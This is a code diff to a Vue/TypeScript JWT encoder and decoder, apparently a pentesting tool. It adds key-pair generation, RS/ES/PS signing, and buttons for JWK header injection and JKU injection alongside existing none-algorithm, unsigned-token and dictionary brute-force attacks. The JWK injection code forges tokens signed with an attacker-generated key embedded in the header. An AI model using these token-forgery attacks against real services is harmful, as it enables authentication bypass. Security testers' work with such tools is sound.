@@ -1,6 +1,6 @@
 <script setup lang="ts">
 import { onMounted, ref } from 'vue'
-import { jwtVerify, SignJWT } from 'jose'
+import { jwtVerify, SignJWT, generateKeyPair, exportJWK } from 'jose'
 
 const algs = ref(["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"])
 const selected_alg = ref("HS256")
@@ -11,6 +11,7 @@ const payload = ref("")
 const verify_signature = ref("")
 const signature_type = ref("")
 const jwt_secret_key = ref("")
+const key_pair = ref({} as any)
 
 const algs_map: { [key: string]: string } = {
     "HS256": `HMACSHA256(
@@ -161,17 +162,29 @@ const encodeJwt = async () => {
             t += "." + s
         }
 
-        if (jwt_secret_key.value && h && p) {
-            // 使用 jose 库进行签名
-            const secret = new TextEncoder().encode(
-                jwt_secret_key.value,
-            )
+        if (h && p && selected_alg.value.includes("HS")) {
+            if (jwt_secret_key.value) {
+                const secret = new TextEncoder().encode(
+                    jwt_secret_key.value,
+                )
 
-            const jwt = await new SignJWT(JSON.parse(payload.value))
-                .setProtectedHeader(JSON.parse(header.value))
-                .sign(secret)
-            t = jwt
+                const jwt = await new SignJWT(JSON.parse(payload.value))
+                    .setProtectedHeader(JSON.parse(header.value))
+                    .sign(secret)
+                t = jwt
+            }
+        } else if (h && p) {
+            if (key_pair.value.priv) {
+                const jwt = await new SignJWT(JSON.parse(payload.value))
+                    .setProtectedHeader(JSON.parse(header.value))
+                    .setExpirationTime('2h')
+                    .sign(key_pair.value.priv)
+                const { payload: verifiedPayload } = await jwtVerify(jwt, key_pair.value.pub);
+                console.log('Verified Payload:', verifiedPayload);
+                t = jwt
+            }
         }
+
         tjwt.value = t
     } catch (e) {
         alert(`${e}`)
@@ -253,6 +266,47 @@ const brute_force_attack = async () => {
     }
 };
 
+const generate_jwk = async () => {
+
+    if (!selected_alg.value.includes("HS")) {
+
+        const { publicKey, privateKey } = await generateKeyPair(selected_alg.value, {
+            extractable: true
+        });
+
+        // Export the public and private keys to JWK format
+        const publicJWK = await exportJWK(publicKey);
+        const privateJWK = await exportJWK(privateKey);
+
+        let pub = JSON.parse(JSON.stringify(publicJWK, null, 2))
+        pub.kid = crypto.randomUUID()
+        key_pair.value = {
+            pub: pub,
+            priv: JSON.parse(JSON.stringify(privateJWK, null, 2))
+        }
+
+    } else {
+        alert("Only RSA, ES, and PSS algorithms support JWK generation.")
+    }
+
+}
+const jwk_injection_attack = async () => {
+
+    await generate_jwk()
+    let h = JSON.parse(header.value)
+    h.alg = selected_alg.value
+    h.typ = "JWT"
+    h.jwk = key_pair.value.pub
+    h.kid = h.jwk.kid
+    header.value = JSON.stringify(h, null, 2)
+    encodeJwt()
+}
+
+const jku_injection_attack = async () => {
+    await generate_jwk()
+    console.log(btoa(JSON.stringify(key_pair.value.pub, null, 2)))
+}
+
 onMounted(async () => {
     sjwt.value = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.CQ13a7rjONXqoy8ARzP8oyKBI2PMNl7z76FCvuKVxo0"
     jwt_secret_key.value = "secure"
@@ -267,7 +321,7 @@ onMounted(async () => {
             <div class="d-flex justify-space-between mt-10">
 
                 <v-btn @mousedown="(event: MouseEvent) => {
-                    console.log(event.button)
+
                     if (event.button === 0) {
                         decodeJwt()
                     } else if (event.button === 1) {
@@ -305,6 +359,9 @@ onMounted(async () => {
                 <v-btn @click="none_attack">None</v-btn>
                 <v-btn class="ml-4" @click="no_sign_attack">No Sign</v-btn>
                 <v-btn class="ml-4" @click="brute_force_attack">Brute</v-btn>
+                <v-btn class="ml-4" @click="jwk_injection_attack">JWK IJ</v-btn>
+                <v-btn class="ml-4" @click="jku_injection_attack">JKU IJ</v-btn>
+                <v-btn class="ml-4">KID PATH</v-btn>
             </div>
             <p class="mt-4">Dictionary: <a
                     href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a></p>
